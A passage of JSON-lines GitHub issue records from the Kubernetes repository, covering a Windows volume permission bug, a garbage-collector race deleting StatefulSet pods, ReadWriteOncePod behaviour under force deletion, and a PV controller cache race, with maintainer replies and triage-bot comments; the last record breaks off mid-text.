{"repo": "kubernetes/kubernetes", "issue_number": 131341, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131341", "issue_title": "Windows ServerCore/NanoServer volume mount ACL issue: ConatinerUser can\u2019t create files at root of CSI\u2011mounted volume", "issue_author": "blackpiglet", "issue_body": "### What happened?\n\n* Create Windows workload mounting volumes.\n* Run the workload with low permission, e.g., `ContainerUser`.\n* After the workload pod starts, try to write files into the volume mounting directory.\n* The write failed with **Acess is denied.** in the mounting path, but I can create a sub-directory and write files in the sub-directory.\n\nThe mounting directory permission setting is as follows:\n```\nPS C:\\data> icacls .\n. BUILTIN\\Administrators:(OI)(CI)(F)\n  NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n  CREATOR OWNER:(OI)(CI)(IO)(F)\n  BUILTIN\\Users:(OI)(CI)(RX)\n  BUILTIN\\Users:(CI)(AD)\n  BUILTIN\\Users:(CI)(IO)(WD)\n  Everyone:(RX)\n```\n\nPlease also notice that users with more permissive permissions don't have this issue, e.g., `ContainerAdministrator`.\n\nThis is the issue created in the CSI proxy repository.\nPost here for cross-reference.\nhttps://github.com/kubernetes-csi/csi-proxy/issues/382\n\n### What did you expect to happen?\n\nI want users like `ContainerUser` to also have permission to create files in the root of the CSI\u2011mounted volume because the Linux containers don't have the issue.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n``` yaml\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: kibishii-deployment\nspec:\n  persistentVolumeClaimRetentionPolicy:\n    whenDeleted: Retain\n    whenScaled: Retain\n  podManagementPolicy: OrderedReady\n  replicas: 2\n  revisionHistoryLimit: 10\n  selector:\n    matchLabels:\n      app: kibishii\n  serviceName: kibishii\n  template:\n    metadata:\n      labels:\n        app: kibishii\n    spec:\n      containers:\n      - args:\n        - ping \n        - -t \n        - localhost \n        - > \n        - NUL\n        command:\n        - cmd.exe\n        - /c\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        image: mcr.microsoft.com/windows/servercore:ltsc2022\n        name: kibishii\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          seccompProfile:\n            type: RuntimeDefault\n        volumeMounts:\n        - mountPath: /data\n          name: kibishii-data\n      dnsPolicy: ClusterFirst\n      nodeSelector:\n        kubernetes.io/os: windows\n      restartPolicy: Always\n      schedulerName: default-scheduler\n      securityContext:\n        windowsOptions:\n          runAsUserName: \"ContainerUser\"\n      terminationGracePeriodSeconds: 30\n      tolerations:\n      - effect: NoSchedule\n        key: os\n        operator: Equal\n        value: windows\n  updateStrategy:\n    rollingUpdate:\n      partition: 0\n    type: RollingUpdate\n  volumeClaimTemplates:\n  - apiVersion: v1\n    kind: PersistentVolumeClaim\n    metadata:\n      name: kibishii-data\n    spec:\n      accessModes:\n      - ReadWriteOnce\n      storageClassName: storage-class-name\n      resources:\n        requests:\n          storage: 50Mi\n      volumeMode: Filesystem\n```\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.30.5\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\nServer Version: v1.33.0\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nvSphere\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/storage", "sig/windows", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "blackpiglet", "body": "/sig windows"}, {"author": "blackpiglet", "body": "/sig storage"}, {"author": "blackpiglet", "body": "I made some modifications to the statefulset YAML in the previous comment.\nPlease modify the `storage-class-name` according to your environment.\n\n\n``` yaml\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: kibishii-deployment\nspec:\n  persistentVolumeClaimRetentionPolicy:\n    whenDeleted: Retain\n    whenScaled: Retain\n  podManagementPolicy: OrderedReady\n  replicas: 2\n  revisionHistoryLimit: 10\n  selector:\n    matchLabels:\n      app: kibishii\n  serviceName: kibishii\n  template:\n    metadata:\n      labels:\n        app: kibishii\n    spec:\n      containers:\n      - args: [\"/c\", \"ping -t localhost > NUL\"]\n        command: [\"cmd\"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        image: mcr.microsoft.com/windows/servercore:ltsc2022\n        name: kibishii\n        securityContext:\n          runAsNonRoot: true\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          seccompProfile:\n            type: RuntimeDefault\n        volumeMounts:\n        - mountPath: /data\n          name: kibishii-data\n      dnsPolicy: ClusterFirst\n      nodeSelector:\n        kubernetes.io/os: windows\n      restartPolicy: Always\n      schedulerName: default-scheduler\n      securityContext:\n        windowsOptions:\n          runAsUserName: \"ContainerUser\"\n      terminationGracePeriodSeconds: 30\n      tolerations:\n      - effect: NoSchedule\n        key: os\n        operator: Equal\n        value: windows\n  updateStrategy:\n    rollingUpdate:\n      partition: 0\n    type: RollingUpdate\n  volumeClaimTemplates:\n  - apiVersion: v1\n    kind: PersistentVolumeClaim\n    metadata:\n      name: kibishii-data\n    spec:\n      accessModes:\n      - ReadWriteOnce\n      storageClassName: storage-class-name\n      resources:\n        requests:\n          storage: 50Mi\n      volumeMode: Filesystem\n```\n\nAfter the pod runs, please run the following commands to verify whether the current user has no permission to write to the volume mounted root path.\n\n```\n kubectl exec -it kibishii-deployment-0 -- cmd\nMicrosoft Windows [Version 10.0.20348.3328]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\>echo %USERNAME%\nContainerUser\n\nC:\\>cd data\n\nC:\\data>dir\n Volume in drive C has no label.\n Volume Serial Number is 7E6C-8216\n\n Directory of C:\\data\n\nFile Not Found\n\nC:\\data>C:\\data>icacls .\n. BUILTIN\\Administrators:(OI)(CI)(F)\n  NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n  CREATOR OWNER:(OI)(CI)(IO)(F)\n  BUILTIN\\Users:(OI)(CI)(RX)\n  BUILTIN\\Users:(CI)(AD)\n  BUILTIN\\Users:(CI)(IO)(WD)\n  Everyone:(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\n\nC:\\data>type nil > 1.txt\nAccess is denied.\n\nC:\\data>\n```"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131341#issuecomment-3289351454):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131284, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131284", "issue_title": "Garbage collector deletes dependents of StatefulSet, when user repeats the recreation of StatefulSet quickly", "issue_author": "masa213f", "issue_body": "### What happened?\n\nWhen I performed the following operations rapidly, the garbage collector occasionally deletes the dependents (Pods or ControllerRevisions) of the StatefulSet. \n\n1. Delete a StatefulSet using the `orphan` propagation policy.\n2. Recreate the StatefulSet with modifications to the volumeClaimTemplates.\n\n### What did you expect to happen?\n\nThe dependents of the StatefulSet should not be deleted.\nThe garbage collector should respect the propagation policy `orphan`.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n(1) Create a StatefulSet.  \n(2) Wait for the pods to become ready.  \n(3) Delete the StatefulSet using the `orphan` propagation policy.  \n(4) Recreate the StatefulSet with changes to the volumeClaimTemplate. (e.g, add labels to the PVC)  \n(5) Delete the StatefulSet again using the `orphan` propagation policy.  \n(6) Recreate the StatefulSet as defined in the first step.  \n\nIn my environment, when the interval between steps (4) and (5) is only a few milliseconds to tens of milliseconds, this bug occurs.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.30.5\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\nServer Version: v1.30.5\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/apps", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "xigang", "body": "When rapidly deleting and recreating a StatefulSet with orphan propagation policy, Pods may be accidentally deleted due to a race condition in the garbage collection process.\n\nRoot Cause:\n\n1. The StatefulSet is marked for deletion and gets an orphan finalizer.\n2. The garbage collector starts asynchronously removing the Pod\u2019s ownerReferences.\n3. The Pod doesn't get any protective finalizers.\n4. A new StatefulSet is created, but it hasn\u2019t become the owner of the Pod yet.\n5. During this window, the garbage collector may see that the Pod has neither an owner nor a finalizer.\n6. As a result, the garbage collector thinks the Pod can be deleted.\n\n```\nfunc (gc *GarbageCollector) attemptToDeleteItem(ctx context.Context, item *node) error {\n    solid, dangling, waitingForDependentsDeletion, err := gc.classifyReferences(ctx, item, ownerReferences)\n    \n    switch {\n    case len(solid) != 0:\n        return nil\n    default:\n        // Key point: If there are no valid owner references\n        // At this point, the object's own finalizers will be checked to determine the deletion policy\n        switch {\n        case hasOrphanFinalizer(latest):\n            policy = metav1.DeletePropagationOrphan\n        case hasDeleteDependentsFinalizer(latest):\n            policy = metav1.DeletePropagationForeground\n        default:\n            // 1. The old owner references are being removed\n            // 2. The new owner has not yet been set\n            // 3. The Pod does not have an orphan finalizer (because it was not directly deleted)\n            // Result: Delete the Pod using the default Background deletion policy\n            policy = metav1.DeletePropagationBackground\n        }\n        return gc.deleteObject(item.identity, &policy)\n    }\n}\n```"}, {"author": "k8s-ci-robot", "body": "@xigang: The label(s) `sig/app` cannot be applied, because the repository doesn't have them.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131284#issuecomment-2801623109):\n\n>/sig app\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "xigang", "body": "/sig apps"}, {"author": "xigang", "body": "/cc @liggitt Take a look at this issue"}, {"author": "xigang", "body": "/assign"}, {"author": "xigang", "body": "FYI @soltysh @wojtek-t @liggitt please take a look when your have time. "}, {"author": "liggitt", "body": "> During this window, the garbage collector may see that the Pod has neither an owner nor a finalizer.\n\nhttps://github.com/kubernetes/kubernetes/blob/44c230bf5c321056e8bc89300b37c497f464f113/pkg/controller/garbagecollector/garbagecollector.go#L545-L554\n\nGC doesn't delete items without owners ... reproducing and fixing that issue seems like a more correct fix than trying to add finalizers to child objects"}, {"author": "liggitt", "body": "I'm wondering if this is sort of a duplicate of https://github.com/kubernetes/kubernetes/issues/114603 and if https://github.com/kubernetes/kubernetes/pull/114828 would help here"}, {"author": "xigang", "body": "Could there be a race condition between `orphanDependents` and `attemptToDeleteItem` when a `StatefulSet` is deleted with `DeletePropagationOrphan`?\n\nIssue timeline:\n1. Deleting a StatefulSet triggers the orphaning process.\n2. The orphaning process (`orphanDependents`) starts asynchronously to handle the dependent objects. https://github.com/kubernetes/kubernetes/blob/44c230bf5c321056e8bc89300b37c497f464f113/pkg/controller/garbagecollector/garbagecollector.go#L668\n3. Before all dependents are fully orphaned, an `attemptToDeleteItem` worker might pick up those objects.\n4. During its check, it finds no valid owner references (since the original StatefulSet is already deleted).\nhttps://github.com/kubernetes/kubernetes/blob/44c230bf5c321056e8bc89300b37c497f464f113/pkg/controller/garbagecollector/garbagecollector.go#L636\n```\n\tdefault:\n\t\tvar policy metav1.DeletionPropagation\n\t\tswitch {\n\t\tcase hasOrphanFinalizer(latest):\n                ....\n\t\tcase hasDeleteDependentsFinalizer(latest):\n                 ....\n\t\tdefault:\n\t\t\t// ?????? the StatefulSet Pod becomes a dangling pod and will be deleted.\n\t\t\tpolicy = metav1.DeletePropagationBackground\n\t\t}\n\t\tlogger.V(2).Info(\"Deleting item\",\n\t\t\t\"item\", item.identity,\n\t\t\t\"propagationPolicy\", policy,\n\t\t)\n\t\treturn gc.deleteObject(item.identity, &policy)\n```\n5. As a result, it mistakenly assumes the objects should be garbage collected, even though they are in the process of being orphaned."}, {"author": "xigang", "body": "Thank you for the thoughtful reply, @liggitt "}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131284#issuecomment-3288606244):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 124244, "issue_url": "https://github.com/kubernetes/kubernetes/issues/124244", "issue_title": "One pv with NFS can be mounted by two pods even with ReadWriteOncePod enabled", "issue_author": "DonghaopengZhu", "issue_body": "### What happened?\r\n\r\nCloud provider: openstack\r\nCsi driver: NFS(Manila)\r\n\r\n- First, I got one replicaSet with 1 replica and RWOP enabled so pod A comes up in node A. \r\n- Then, edit the nodeSelector to node B and forcibly delete the pod A which results in the pod A in terminate state and pod B is running in node B. \r\n- During this short period, pod A and pod B can both write data to the same pv even with RWOP enabled.\r\n- After pod A is eliminated, pod B fully controls the volume.\r\n\r\n### What did you expect to happen?\r\n\r\nThe pv should always read-write by a single pod but not access by two pods when the old one is in grace period.\r\n\r\n### How can we reproduce it (as minimally and precisely as possible)?\r\n\r\n1. Apply a replicaSet with 1 replica and RWOP enabled like:\r\n```\r\napiVersion: apps/v1\r\nkind: ReplicaSet\r\nmetadata:\r\n  name: test\r\nspec:\r\n  replicas: 1\r\n  selector:\r\n    matchLabels:\r\n      app: test\r\n  template:\r\n    metadata:\r\n      labels:\r\n        app: test\r\n    spec:\r\n      terminationGracePeriodSeconds: 120\r\n      containers:\r\n      - name: writer\r\n        image: busybox\r\n        env:\r\n        - name: MY_POD_NAME\r\n          valueFrom:\r\n            fieldRef:\r\n              fieldPath: metadata.name\r\n        volumeMounts:\r\n        - name: my-volume\r\n          mountPath: \"/mnt\"\r\n        command: [\"/bin/sh\"]\r\n        args:\r\n        - -c\r\n        - |\r\n          while true; do\r\n            echo $MY_POD_NAME $(date) >> /mnt/myfile.txt;\r\n            sleep 1;\r\n          done\r\n      volumes:\r\n      - name: my-volume\r\n        persistentVolumeClaim:\r\n          claimName: pvc-rwop\r\n     nodeSelector:\r\n       xxx\r\n```\r\n3. After pod is running, change the nodeSelector in replicaSet to another node\r\n4. Forcibly delete the pod with `kubectl delete pod test-5nffh --force `\r\n5. A new node `test-g6vnt `should come up in a different node and the old pod should be terminated\r\n6. At this time, pv is writable for these two pods and the file /mnt/myfile.txt is overlapped like this:\r\n```\r\n# cat /mnt/myfile.txt\r\ntest-5nffh Tue Apr 9 07:29:03 UTC 2024\r\ntest-5nffh Tue Apr 9 07:29:04 UTC 2024\r\ntest-5nffh Tue Apr 9 07:29:05 UTC 2024\r\ntest-g6vnt Tue Apr 9 07:29:06 UTC 2024\r\ntest-5nffh Tue Apr 9 07:29:06 UTC 2024\r\ntest-g6vnt Tue Apr 9 07:29:07 UTC 2024\r\ntest-5nffh Tue Apr 9 07:29:07 UTC 2024\r\ntest-g6vnt Tue Apr 9 07:29:08 UTC 2024\r\ntest-5nffh Tue Apr 9 07:29:08 UTC 2024\r\n```\r\n7. That means during the shutdown period, pv can be accessible for two pods simultaneously \r\n\r\n\r\n\r\n### Anything else we need to know?\r\n\r\n_No response_\r\n\r\n### Kubernetes version\r\n\r\n<details>\r\n\r\n```console\r\n$ kubectl version\r\n# \r\nServer Version: v1.28.6\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Cloud provider\r\n\r\n<details>\r\nopenstack\r\n</details>\r\n\r\n\r\n### OS version\r\n\r\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\nVERSION=\"15-SP3\"\r\nVERSION_ID=\"15.3\"\r\nPRETTY_NAME=\"SUSE Linux Enterprise Server 15 SP3\"\r\n$ uname -a\r\nDebian 6.1.77-0gardenlinux1 (2024-02-12) x86_64 x86_64 x86_64 GNU/Linux\r\n\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Install tools\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Container runtime (CRI) and version (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\r\n\r\n<details>\r\ncsidriver is: nfs.manila.csi.openstack.org\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/storage", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "neolit123", "body": "note, if the problem is with the manila CSI plugin the ticket should be logged here:\r\nhttps://github.com/kubernetes/cloud-provider-openstack/issues\r\nnot in kubernetes/kubernetes.\r\n\r\n/sig storage\r\n"}, {"author": "DonghaopengZhu", "body": "Hi @neolit123, thanks for pointing out. I'll do it later. But let's put manila aside and I'm wondering if it's designed as such when it comes to NFS? I'm asking because NFS has no concept of an attach that means if a pod is being force deletion, a new pod can read-write the same pv because attachdetach-controller is unable to detect it even with ReadWriteOncePod enabled."}, {"author": "xing-yang", "body": "@DonghaopengZhu K8s has no way to detect this if the pod is forced deleted. For this feature to work, the pod has to be graceful terminated.  We should probably document this more clearly.  We can accept this as a doc bug.\r\n\r\n/cc @jsafrane \r\n/triage accepted"}, {"author": "jsafrane", "body": "> 4. Forcibly delete the pod with kubectl delete pod test-5nffh --force \r\n\r\nForce delete has consequences. For example, it will break StatefulSet guarantees that only one replica of a Pod ever runs. StatfulSet controller will immediately start a new replica, while the deleted one is still running somewhere. And it will break RWOP guarantees too, as you describe here.\r\n\r\nI don't think it's a bug in Kubernetes. You literally force-delete the only evidence that there is another pod using the volume."}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/124244#issuecomment-3288528517):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 124224, "issue_url": "https://github.com/kubernetes/kubernetes/issues/124224", "issue_title": "Race condition in PV controller storeObjectUpdate()", "issue_author": "huww98", "issue_body": "### What happened?\r\n\r\nPV controller (in KCM) has its own cache in addition to the informer cache, to store updates from itself. However, we've identified 2 possible race condition when invoking `storeObjectUpdate()` from multiple goroutines.\r\n\r\n`storeObjectUpdate()` is currently invoked from `setClaimProvisioner()` and `syncUnboundClaim()`, which runs in 2 different goroutine. And I would expect more concurrent access for enhanced throughput in the future.\r\n\r\nRace conditions:\r\n1. internal update overwrites external delete. When a object is deleted from APIServer, an update request from controller itself may still in-flight. After the update returns, it tries to insert the object back to the cache, overwriting deletion propagated from informer. Resulting in the object staying in cache forever. Subsequently causing, for example, PV stay in Bound state forever and cannot be released.\r\n2. read-compare-write in `storeObjectUpdate()`. When invoked concurrently, an old version (defined by ResourceVersion) may overwrite new version. Resulting in 15s cache stall (should be fixed by next sync).\r\n\r\n### What did you expect to happen?\r\n\r\nNo race conditions. Internal 